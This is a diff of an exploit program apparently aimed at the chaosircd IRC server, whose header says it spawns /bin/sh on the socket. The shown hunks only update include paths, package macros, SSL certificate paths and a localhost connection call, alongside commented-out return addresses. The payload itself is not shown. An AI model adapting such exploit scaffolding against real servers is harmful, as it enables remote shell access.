@@ -2,17 +2,17 @@
  * This exploits chaosircd and spawns /bin/sh on the socket                   *
  * -------------------------------------------------------------------------- */
 
-#include <libchaos/config.h>
-#include <libchaos/io.h>
-#include <libchaos/log.h>
-#include <libchaos/mem.h>
-#include <libchaos/str.h>
-#include <libchaos/ssl.h>
-#include <libchaos/timer.h>
-#include <libchaos/dlink.h>
-#include <libchaos/connect.h>
+#include "ircd/config.h"
+#include "libchaos/io.h"
+#include "libchaos/log.h"
+#include "libchaos/mem.h"
+#include "libchaos/str.h"
+#include "libchaos/ssl.h"
+#include "libchaos/timer.h"
+#include "libchaos/dlink.h"
+#include "libchaos/connect.h"
 
-#include <chaosircd/config.h>
+#include "ircd/config.h"
 
 //#define RETADDR 0x4003f6d0
 //#define RETADDR 0x08099145
@@ -34,8 +34,8 @@ struct protocol *sploit_proto;
 void sploit_init(void)
 {
   log(sploit_log, L_startup, "%s v%s sploit",
-      PROJECT_NAME, PROJECT_VERSION, PROJECT_RELEASE);
-  
+      PACKAGE_NAME, PACKAGE_VERSION, PACKAGE_RELEASE);
+
   log_init(STDOUT_FILENO, LOG_ALL, L_status);
   io_init_except(STDIN_FILENO, STDOUT_FILENO, STDERR_FILENO);
 
@@ -220,11 +220,11 @@ void sploit_run(void)
   sploit_proto = net_register(NET_CLIENT, "sploit", sploit_handler);
 
   ssl_add("connect", SSL_CONTEXT_CLIENT,
-          "/etc/chaosircd/ircd.crt", "/etc/chaosircd/ircd.key",
+          "/etc/ircd/ircd.crt", "/etc/ircd/ircd.key",
           "RSA+HIGH:RSA+MEDIUM:@STRENGTH");
-  
-  sploit_connect = connect_add("127.0.0.1", 6667, sploit_proto, 
-                               30000ull, 0, 1, 0, "connect");
+
+  sploit_connect = connect_add("127.0.0.1", 6667, sploit_proto,
+                               30000LLU, 0, 1, 0, "connect");
 
   connect_start(sploit_connect);
 }
